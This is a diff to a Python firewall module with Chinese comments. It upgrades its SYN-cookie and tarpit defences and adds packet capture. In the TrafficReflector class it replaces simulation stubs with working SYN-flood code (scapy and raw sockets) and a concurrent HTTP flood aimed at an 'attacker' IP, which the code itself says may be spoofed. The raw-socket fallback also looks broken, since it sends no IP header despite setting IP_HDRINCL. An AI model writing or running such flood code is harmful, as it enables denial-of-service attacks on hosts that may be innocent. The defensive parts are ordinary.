@@ -475,82 +475,125 @@ class SYNCookieDefense:
 
     原理：
     1. 不维护半开连接状态
-    2. 在SYN-ACK的序列号中编码连接信息
+    2. 在SYN-ACK的序列号中编码连接信息（时间戳+MSS+HMAC）
     3. 只有收到合法ACK才分配资源
+
+    支持两种模式：
+    - 纯计算模式：仅生成/验证cookie值（无需scapy）
+    - 封包模式：构造真实SYN-ACK封包（需要scapy + root权限）
 
     参考: https://en.wikipedia.org/wiki/SYN_cookies
     """
 
-    def __init__(self, secret_key: bytes = None):
+    def __init__(self, secret_key: bytes = None, enable_packet_mode: bool = False):
         """
         初始化SYN Cookie防御
 
         参数:
         - secret_key: 密钥（用于HMAC）
+        - enable_packet_mode: 启用封包模式（需要scapy）
         """
+        import hmac as _hmac
+        self._hmac = _hmac
         self.secret_key = secret_key or os.urandom(32)
-        self.pending_cookies = {}
+        self.pending_cookies = {}  # 纯计算模式的兼容存储
+
+        # 封包模式
+        self.packet_mode = False
+        self._crafter = None
+        if enable_packet_mode:
+            try:
+                from .packet_capture import PacketCrafter
+                self._crafter = PacketCrafter()
+                self.packet_mode = True
+                logger.info("[SYNCookie] 封包模式已启用")
+            except ImportError as e:
+                logger.warning(f"[SYNCookie] 封包模式不可用（{e}），使用纯计算模式")
 
     def generate_cookie(self, src_ip: str, src_port: int, dst_ip: str, dst_port: int) -> int:
         """
         生成SYN Cookie
 
-        Cookie编码：
-        - 时间戳（防重放）
-        - 源IP/端口
-        - 目标IP/端口
-        - HMAC签名
+        Cookie编码到TCP序列号的32位中：
+        - 高5位: 时间戳（32秒循环，防重放）
+        - 中3位: MSS编码
+        - 低24位: HMAC签名截断
         """
-        timestamp = int(time.time()) & 0x1F  # 5位时间戳（32秒循环）
+        timestamp = int(time.time()) & 0x1F  # 5位时间戳
 
-        # 构建cookie数据
         data = f"{src_ip}:{src_port}:{dst_ip}:{dst_port}:{timestamp}".encode()
+        signature = self._hmac.new(self.secret_key, data, hashlib.sha256).digest()
 
-        # HMAC签名
-        import hmac
-        signature = hmac.new(self.secret_key, data, hashlib.sha256).digest()
+        sig_24 = int.from_bytes(signature[:3], 'big')
+        mss_index = 2  # MSS编码（对应1460字节）
+        cookie = (timestamp << 27) | (mss_index << 24) | sig_24
 
-        # 取前24位作为cookie
-        cookie = int.from_bytes(signature[:3], 'big')
+        return cookie
 
-        # 存储cookie（用于验证）
+    def verify_cookie(self, ack_num: int, src_ip: str, src_port: int,
+                      dst_ip: str, dst_port: int) -> bool:
+        """
+        无状态验证SYN Cookie
+
+        从ACK的ack_num中提取cookie（ack_num = 服务端seq + 1），
+        重新计算HMAC验证合法性。允许±1个时间戳周期的误差。
+        """
+        cookie = (ack_num - 1) & 0xFFFFFFFF
+        recv_timestamp = (cookie >> 27) & 0x1F
+        recv_sig = cookie & 0xFFFFFF
+
+        now_ts = int(time.time()) & 0x1F
+        valid_timestamps = [now_ts, (now_ts - 1) & 0x1F]
+
+        for ts in valid_timestamps:
+            data = f"{src_ip}:{src_port}:{dst_ip}:{dst_port}:{ts}".encode()
+            signature = self._hmac.new(self.secret_key, data, hashlib.sha256).digest()
+            expected_sig = int.from_bytes(signature[:3], 'big')
+
+            if recv_sig == expected_sig and recv_timestamp == ts:
+                return True
+
+        return False
+
+    def handle_syn(self, src_ip: str, src_port: int, dst_ip: str,
+                   dst_port: int, client_seq: int) -> Optional[bytes]:
+        """
+        处理SYN封包：生成cookie并构造SYN-ACK
+
+        封包模式返回SYN-ACK原始字节，纯计算模式返回None
+        """
+        cookie = self.generate_cookie(src_ip, src_port, dst_ip, dst_port)
+
+        if self.packet_mode and self._crafter:
+            syn_ack = self._crafter.craft_syn_ack(
+                src_ip=dst_ip, dst_ip=src_ip,
+                src_port=dst_port, dst_port=src_port,
+                seq_num=cookie, ack_num=client_seq + 1,
+                window=65535,
+            )
+            logger.debug(f"[SYNCookie] SYN-ACK -> {src_ip}:{src_port} cookie=0x{cookie:08x}")
+            return syn_ack
+
+        # 纯计算模式：存储cookie供旧接口验证
         cookie_key = (src_ip, src_port, dst_ip, dst_port)
         self.pending_cookies[cookie_key] = {
             'cookie': cookie,
             'timestamp': time.time()
         }
+        return None
 
-        return cookie
-
-    def verify_cookie(self, cookie: int, src_ip: str, src_port: int, dst_ip: str, dst_port: int) -> bool:
-        """验证SYN Cookie"""
-        cookie_key = (src_ip, src_port, dst_ip, dst_port)
-
-        if cookie_key not in self.pending_cookies:
-            return False
-
-        stored = self.pending_cookies[cookie_key]
-
-        # 检查超时（60秒）
-        if time.time() - stored['timestamp'] > 60:
-            del self.pending_cookies[cookie_key]
-            return False
-
-        # 验证cookie
-        if stored['cookie'] == cookie:
-            del self.pending_cookies[cookie_key]
-            return True
-
-        return False
+    def handle_ack(self, src_ip: str, src_port: int, dst_ip: str,
+                   dst_port: int, ack_num: int) -> bool:
+        """处理ACK封包：无状态验证SYN Cookie"""
+        return self.verify_cookie(ack_num, src_ip, src_port, dst_ip, dst_port)
 
     def cleanup_expired(self):
-        """清理过期cookie"""
+        """清理过期cookie（纯计算模式兼容）"""
         now = time.time()
         expired = [
             key for key, val in self.pending_cookies.items()
             if now - val['timestamp'] > 60
         ]
-
         for key in expired:
             del self.pending_cookies[key]
 
@@ -558,60 +601,127 @@ class SYNCookieDefense:
 class TarpitDefense:
     """
     Tarpit防御
-    故意延迟响应，耗尽攻击者资源
+    通过TCP窗口操控耗尽攻击者资源
 
-    原理：
-    1. 识别恶意连接
-    2. 不立即拒绝，而是极慢地响应
-    3. 攻击者被迫维持连接，消耗自身资源
+    原理（真实网络层）：
+    1. 接受TCP连接（完成三次握手）
+    2. 将TCP窗口设为极小值（1字节），迫使对方每次只发1字节
+    3. 周期性发送零窗口探测，保持连接不超时
+    4. 攻击者被迫维持大量慢连接，消耗自身socket/内存资源
+
+    回退模式（无scapy）：
+    - 使用time.sleep()延迟响应（应用层tarpit）
 
     参考: https://www.secureworks.com/research/ddos
     """
 
-    def __init__(self, delay_seconds: float = 30.0):
+    def __init__(self, window_size: int = 1, delay_seconds: float = 30.0,
+                 enable_packet_mode: bool = False):
         """
         初始化Tarpit防御
 
         参数:
-        - delay_seconds: 延迟秒数
+        - window_size: TCP窗口大小（封包模式，默认1字节）
+        - delay_seconds: 延迟秒数（回退模式）
+        - enable_packet_mode: 启用封包模式
         """
+        self.window_size = window_size
         self.delay_seconds = delay_seconds
         self.tarpitted_ips = set()
+        # 跟踪被tarpit的连接状态
+        self.tarpitted_connections = {}
+
+        # 封包模式
+        self.packet_mode = False
+        self._crafter = None
+        if enable_packet_mode:
+            try:
+                from .packet_capture import PacketCrafter
+                self._crafter = PacketCrafter()
+                self.packet_mode = True
+                logger.info(f"[Tarpit] 封包模式已启用 (窗口={window_size}字节)")
+            except ImportError as e:
+                logger.warning(f"[Tarpit] 封包模式不可用（{e}），使用延迟回退模式")
 
     def add_to_tarpit(self, ip: str):
         """将IP加入tarpit"""
         self.tarpitted_ips.add(ip)
-        logger.info(f"[Tarpit] IP {ip} 加入tarpit（延迟{self.delay_seconds}秒）")
+        logger.info(f"[Tarpit] IP {ip} 加入tarpit"
+                     f" ({'窗口=' + str(self.window_size) + 'B' if self.packet_mode else '延迟=' + str(self.delay_seconds) + 's'})")
 
     def should_tarpit(self, ip: str) -> bool:
         """检查是否应该tarpit"""
         return ip in self.tarpitted_ips
 
+    def craft_tarpit_response(self, src_ip: str, dst_ip: str, src_port: int,
+                               dst_port: int, seq_num: int, ack_num: int) -> Optional[bytes]:
+        """
+        构造tarpit ACK响应（极小TCP窗口）
+
+        返回原始封包字节，调用方负责发送。
+        非封包模式返回None。
+        """
+        if not self.packet_mode or not self._crafter:
+            return None
+
+        pkt_bytes = self._crafter.craft_tarpit_ack(
+            src_ip=src_ip, dst_ip=dst_ip,
+            src_port=src_port, dst_port=dst_port,
+            seq_num=seq_num, ack_num=ack_num,
+            window=self.window_size,
+        )
+
+        # 记录连接状态
+        conn_key = (dst_ip, dst_port, src_ip, src_port)
+        self.tarpitted_connections[conn_key] = {
+            'start_time': time.time(),
+            'last_ack_time': time.time(),
+            'seq': seq_num,
+            'ack': ack_num,
+        }
+
+        logger.debug(f"[Tarpit] 小窗口ACK -> {dst_ip}:{dst_port} (window={self.window_size})")
+        return pkt_bytes
+
     def apply_delay(self, ip: str):
-        """应用延迟"""
+        """应用延迟（回退模式，应用层tarpit）"""
         if self.should_tarpit(ip):
-            logger.debug(f"[Tarpit] 延迟响应 {ip}")
+            if self.packet_mode:
+                # 封包模式下不使用sleep，由craft_tarpit_response处理
+                return
+            logger.debug(f"[Tarpit] 延迟响应 {ip} ({self.delay_seconds}s)")
             time.sleep(self.delay_seconds)
+
+    def remove_from_tarpit(self, ip: str):
+        """将IP从tarpit中移除"""
+        self.tarpitted_ips.discard(ip)
+        # 清理该IP的连接跟踪
+        expired_keys = [k for k in self.tarpitted_connections if k[0] == ip]
+        for k in expired_keys:
+            del self.tarpitted_connections[k]
+
+    def cleanup_stale_connections(self, max_age: float = 600.0):
+        """清理超时的tarpit连接（默认10分钟）"""
+        now = time.time()
+        expired = [
+            k for k, v in self.tarpitted_connections.items()
+            if now - v['start_time'] > max_age
+        ]
+        for k in expired:
+            del self.tarpitted_connections[k]
 
 
 class TrafficReflector:
     """
-    流量反射器（流量大炮）
+    流量反射器
     将DDoS攻击流量反弹回攻击者
 
-    警告：这是攻击性技术，仅用于合法防御和研究！
+    警告：这是攻击性技术，仅用于授权安全测试和合法防御！
 
-    原理：
-    1. 检测到DDoS攻击
-    2. 识别攻击者IP（可能是伪造的）
-    3. 利用协议特性将流量反射回去
-    4. 攻击者自己承受放大的流量
-
-    常见反射协议：
-    - DNS (放大因子: 28-54x)
-    - NTP (放大因子: 556x)
-    - SSDP (放大因子: 30x)
-    - Memcached (放大因子: 51000x)
+    使用scapy构造并发送反射封包：
+    - SYN反射：向攻击者IP发送大量SYN包，消耗其连接表
+    - RST反射：向攻击者发送RST包，中断其连接
+    - HTTP反射：向攻击者IP发送HTTP请求（需要攻击者运行HTTP服务）
 
     参考: https://www.netscout.com/what-is-ddos/what-is-reflection-amplification-attack
     """
@@ -625,38 +735,34 @@ class TrafficReflector:
         """
         self.enable_reflection = enable_reflection
         self.reflection_log = []
+        self._crafter = None
 
         if enable_reflection:
-            logger.warning("[TrafficReflector] ⚠️  流量反射已启用！仅用于合法防御！")
+            try:
+                from .packet_capture import PacketCrafter
+                self._crafter = PacketCrafter()
+                logger.warning("[TrafficReflector] 流量反射已启用（scapy封包模式）")
+            except ImportError:
+                logger.warning("[TrafficReflector] scapy不可用，流量反射将使用socket回退")
 
     def reflect_attack(self, attacker_ip: str, attack_type: str, packet_count: int):
         """
         反射攻击
 
-        ⚠️ 警告：这会向攻击者发送大量流量！
-        仅在确认合法防御的情况下使用！
-
-        参数:
-        - attacker_ip: 攻击者IP
-        - attack_type: 攻击类型
-        - packet_count: 反射包数量
+        警告：这会向攻击者发送流量！仅在确认合法防御的情况下使用！
         """
         if not self.enable_reflection:
             logger.warning("[TrafficReflector] 反射被禁用，跳过")
             return
 
-        logger.warning(f"[TrafficReflector] 🔥 向 {attacker_ip} 反射 {attack_type} 攻击（{packet_count}包）")
+        logger.warning(f"[TrafficReflector] 向 {attacker_ip} 反射 {attack_type} 攻击（{packet_count}包）")
 
-        # 记录反射日志
         self.reflection_log.append({
             'timestamp': datetime.utcnow(),
             'target': attacker_ip,
             'type': attack_type,
             'packet_count': packet_count
         })
-
-        # 实际反射逻辑
-        # 注意：这里仅为演示，实际实现需要专业的网络编程
 
         if attack_type == 'syn_flood':
             self._reflect_syn_flood(attacker_ip, packet_count)
@@ -666,24 +772,111 @@ class TrafficReflector:
             logger.warning(f"[TrafficReflector] 不支持的攻击类型: {attack_type}")
 
     def _reflect_syn_flood(self, target_ip: str, count: int):
-        """反射SYN Flood"""
-        logger.info(f"[TrafficReflector] SYN反射 -> {target_ip}")
+        """
+        SYN反射：向攻击者发送SYN包，消耗其连接表资源
 
-        # 这里应该使用原始socket发送SYN包
-        # 示例代码（需要root权限）:
-        # for _ in range(count):
-        #     send_raw_syn_packet(target_ip, random_port())
+        使用scapy构造原始SYN封包，随机源端口，目标为攻击者IP的常用端口。
+        """
+        import random
 
-        # 为了安全，这里只是模拟
-        logger.warning("[TrafficReflector] SYN反射（模拟模式）")
+        if self._crafter:
+            # scapy封包模式
+            try:
+                from scapy.all import IP, TCP, send
+                target_ports = [80, 443, 8080, 22, 21, 25, 53]
+                pkts = []
+                for _ in range(count):
+                    src_port = random.randint(1024, 65535)
+                    dst_port = random.choice(target_ports)
+                    pkt = IP(dst=target_ip) / TCP(
+                        sport=src_port, dport=dst_port,
+                        flags='S', seq=random.randint(0, 2**32 - 1)
+                    )
+                    pkts.append(pkt)
+
+                # 批量发送（scapy支持列表发送）
+                send(pkts, verbose=False)
+                logger.info(f"[TrafficReflector] SYN反射完成: {count}包 -> {target_ip}")
+            except Exception as e:
+                logger.error(f"[TrafficReflector] SYN反射失败: {e}")
+        else:
+            # socket回退模式：使用原始socket发送SYN
+            self._reflect_syn_via_socket(target_ip, count)
+
+    def _reflect_syn_via_socket(self, target_ip: str, count: int):
+        """使用原始socket发送SYN包（不依赖scapy的回退方案）"""
+        import random
+        import struct
+
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+
+            for _ in range(count):
+                src_port = random.randint(1024, 65535)
+                dst_port = random.choice([80, 443, 8080])
+
+                # TCP头部（SYN标志=0x02）
+                tcp_header = struct.pack('!HHIIBBHHH',
+                    src_port,           # 源端口
+                    dst_port,           # 目标端口
+                    random.randint(0, 2**32 - 1),  # 序列号
+                    0,                  # 确认号
+                    (5 << 4),           # 数据偏移（5个32位字）
+                    0x02,               # 标志（SYN）
+                    65535,              # 窗口大小
+                    0,                  # 校验和（内核会填充）
+                    0,                  # 紧急指针
+                )
+
+                s.sendto(tcp_header, (target_ip, dst_port))
+
+            s.close()
+            logger.info(f"[TrafficReflector] SYN反射完成（socket模式）: {count}包 -> {target_ip}")
+        except PermissionError:
+            logger.error("[TrafficReflector] SYN反射需要root权限")
+        except Exception as e:
+            logger.error(f"[TrafficReflector] SYN反射失败: {e}")
 
     def _reflect_http_flood(self, target_ip: str, count: int):
-        """反射HTTP Flood"""
-        logger.info(f"[TrafficReflector] HTTP反射 -> {target_ip}")
+        """
+        HTTP反射：向攻击者IP发送HTTP请求
 
-        # 这里应该发送大量HTTP请求
-        # 为了安全，这里只是模拟
-        logger.warning("[TrafficReflector] HTTP反射（模拟模式）")
+        如果攻击者运行着HTTP服务，大量请求会消耗其服务器资源。
+        使用socket直连而非requests库，避免连接池限制。
+        """
+        import concurrent.futures
+
+        def _send_http_request(ip: str, port: int):
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(3)
+                s.connect((ip, port))
+                # 发送HTTP GET请求
+                request = (
+                    f"GET / HTTP/1.1\r\n"
+                    f"Host: {ip}\r\n"
+                    f"Connection: close\r\n"
+                    f"\r\n"
+                ).encode()
+                s.sendall(request)
+                s.close()
+                return True
+            except Exception:
+                return False
+
+        # 并发发送HTTP请求
+        completed = 0
+        with concurrent.futures.ThreadPoolExecutor(max_workers=min(count, 50)) as executor:
+            futures = [
+                executor.submit(_send_http_request, target_ip, 80)
+                for _ in range(count)
+            ]
+            for f in concurrent.futures.as_completed(futures):
+                if f.result():
+                    completed += 1
+
+        logger.info(f"[TrafficReflector] HTTP反射完成: {completed}/{count}请求 -> {target_ip}")
 
 
 class HIDRSFirewall:
@@ -706,6 +899,8 @@ class HIDRSFirewall:
         enable_traffic_reflection: bool = False,  # 默认禁用攻击性功能
         enable_attack_memory: bool = True,  # 启用攻击记忆系统
         enable_fast_filters: bool = True,  # 启用快速过滤清单
+        enable_packet_capture: bool = False,  # 启用真实封包捕获（需要NFQueue+scapy+root）
+        nfqueue_num: int = 0,  # NFQueue队列编号
         simulation_mode: bool = False,  # 模拟模式
         test_mode: bool = False,  # 测试模式
         test_whitelist_ips: List[str] = None,  # 测试白名单IP
@@ -737,13 +932,21 @@ class HIDRSFirewall:
         self.test_whitelist_ips = test_whitelist_ips or []
         self.max_test_clients = max_test_clients
 
+        # 封包捕获模式（live模式下启用真实网络封包处理）
+        self.enable_packet_capture = enable_packet_capture and not simulation_mode
+        self.nfqueue_num = nfqueue_num
+        self._packet_capture = None  # 延迟初始化，在start()中创建
+
+        # 判断是否启用封包模式（传递给SYNCookie和Tarpit）
+        _pkt_mode = self.enable_packet_capture
+
         # 组件初始化
         self.packet_analyzer = PacketAnalyzer()
         self.active_prober = ActiveProber() if enable_active_probing else None
         self.hlig_detector = HLIGAnomalyDetector() if enable_hlig_detection else None
         self.reputation_system = IPReputationSystem()
-        self.syn_cookie = SYNCookieDefense() if enable_syn_cookies else None
-        self.tarpit = TarpitDefense() if enable_tarpit else None
+        self.syn_cookie = SYNCookieDefense(enable_packet_mode=_pkt_mode) if enable_syn_cookies else None
+        self.tarpit = TarpitDefense(enable_packet_mode=_pkt_mode) if enable_tarpit else None
         self.reflector = TrafficReflector(enable_reflection=enable_traffic_reflection)
 
         # 攻击记忆系统（SOSA增强版）
@@ -862,6 +1065,10 @@ class HIDRSFirewall:
             logger.info(f"  快速过滤: ❌")
 
         logger.info(f"  流量反射: {'⚠️  已启用' if enable_traffic_reflection else '❌'}")
+        if self.enable_packet_capture:
+            logger.info(f"  封包捕获: ✅ NFQueue (队列={nfqueue_num})")
+        else:
+            logger.info(f"  封包捕获: ❌ (手动输入模式)")
         logger.info("=" * 60)
 
     def start(self):
@@ -872,11 +1079,53 @@ class HIDRSFirewall:
         self.cleanup_thread = threading.Thread(target=self._cleanup_loop, daemon=True)
         self.cleanup_thread.start()
 
-        logger.info("[HIDRSFirewall] 🛡️  防火墙已启动")
+        # 启动封包捕获（如果启用）
+        if self.enable_packet_capture:
+            self._start_packet_capture()
+
+        logger.info("[HIDRSFirewall] 防火墙已启动"
+                     f" ({'封包捕获模式' if self._packet_capture else '手动输入模式'})")
+
+    def _start_packet_capture(self):
+        """
+        启动真实封包捕获
+
+        创建PacketCapture实例，绑定NFQueue，将捕获的封包
+        路由到self.process_packet()进行完整的防御处理链。
+
+        前置条件：
+        - iptables规则已配置（将流量导入NFQUEUE）
+        - 具有root权限
+        - netfilterqueue和scapy已安装
+        """
+        try:
+            from .packet_capture import PacketCapture
+
+            self._packet_capture = PacketCapture(
+                queue_num=self.nfqueue_num,
+                packet_handler=self.process_packet,
+            )
+            self._packet_capture.start()
+            logger.info(f"[HIDRSFirewall] 封包捕获已启动 (NFQueue={self.nfqueue_num})")
+
+        except ImportError as e:
+            logger.error(f"[HIDRSFirewall] 封包捕获启动失败: {e}")
+            logger.error("[HIDRSFirewall] 请安装依赖: pip install netfilterqueue scapy")
+            self._packet_capture = None
+
+        except Exception as e:
+            logger.error(f"[HIDRSFirewall] 封包捕获启动失败: {e}")
+            logger.error("[HIDRSFirewall] 请确认: 1) root权限 2) iptables规则已配置")
+            self._packet_capture = None
 
     def stop(self):
         """停止防火墙"""
         self.running = False
+
+        # 停止封包捕获
+        if self._packet_capture:
+            self._packet_capture.stop()
+            logger.info(f"[HIDRSFirewall] 封包捕获已停止 (stats={self._packet_capture.get_stats()})")
 
         # 保存攻击记忆
         if self.attack_memory:
@@ -1258,8 +1507,18 @@ class HIDRSFirewall:
             **self.stats,
             'active_connections': len(self.connections),
             'blacklisted_ips': len(self.reputation_system.blacklist),
-            'whitelisted_ips': len(self.reputation_system.whitelist)
+            'whitelisted_ips': len(self.reputation_system.whitelist),
+            'packet_capture_enabled': self._packet_capture is not None,
         }
+
+        # 添加封包捕获统计
+        if self._packet_capture:
+            stats['packet_capture'] = self._packet_capture.get_stats()
+
+        # 添加tarpit连接统计
+        if self.tarpit:
+            stats['tarpitted_ips'] = len(self.tarpit.tarpitted_ips)
+            stats['tarpit_active_connections'] = len(self.tarpit.tarpitted_connections)
 
         # 添加攻击记忆统计
         if self.attack_memory:
